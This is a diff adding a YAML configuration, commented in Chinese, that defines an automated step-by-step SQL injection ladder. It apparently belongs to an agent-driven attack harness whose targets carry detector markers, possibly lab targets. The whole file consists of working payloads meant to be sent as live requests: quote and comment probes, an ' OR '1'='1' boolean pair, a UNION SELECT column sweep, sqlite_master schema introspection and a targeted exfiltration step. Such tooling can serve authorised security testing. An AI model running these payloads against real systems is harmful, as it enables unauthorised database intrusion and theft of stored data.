@@ -1,0 +1,59 @@
+# 可执行阶梯（信号驱动搜索）—— sqli
+#
+# 设计来源：vendor/hack-skills/skills/sqli-sql-injection 的"首轮集合"与"DBMS 路由线索"，
+# 但这里**是可执行数据**，不是文档：每步都会真发请求，步进由硬信号决定。
+# 硬信号 = 状态码 / 响应长度差分 / marker 命中；模型判断不参与步进决策。
+class: sqli
+display: SQL 注入（等值/字符串字面量拼接）
+
+baseline:
+  param_value: "1"            # 中性基线值（不存在也不报错的那种）
+
+steps:
+  - id: quote_probe
+    kind: single
+    value: "{v}'"
+    note: 引号未闭合 ⇒ 语法错（状态码跃迁或长度突变）
+
+  - id: dquote_probe
+    kind: single
+    value: '{v}"'
+
+  - id: comment_probe
+    kind: single
+    value: "{v}' -- "
+    note: 注释可截断尾部子句 ⇒ 若成功，前面的语法错会消失
+
+  - id: comment_probe_hash
+    kind: single
+    value: "{v}'#"
+
+  - id: boolean_pair
+    kind: pair
+    true_value: "{v}' OR '1'='1"
+    false_value: "{v}' OR '1'='2"
+    note: 真/假两发响应长度应出现稳定差 ⇒ 条件可控
+
+  - id: column_count
+    kind: sweep
+    template: "{v}' UNION SELECT {nulls}-- "
+    from: 1
+    to: 12
+    note: 只有列宽匹配的那一发不报错（其余通常 500 或空）
+
+  - id: introspect
+    kind: rotation
+    # 自省：把 schema 文本塞进各个列位轮换，直到 marker 出现在响应里。
+    # 为什么轮换：实测目标里不同列位的渲染方式不同（数值列会把文本吃掉）。
+    dbms: sqlite
+    expression: "type,name,sql,tbl_name,rootpage"
+    from_table: sqlite_master
+    note: 命中即确认（marker 由目标 plugin.yaml 的 detector.markers 给出）
+
+  - id: exfil_targeted
+    kind: rotation
+    dbms: sqlite
+    expression: "type,name,sql,tbl_name,rootpage"
+    from_table: sqlite_master
+    where: "name='{table}'"          # 目标表名由 agent 从自省结果里读（若未提供则跳过）
+    requires: [introspect_table_name]
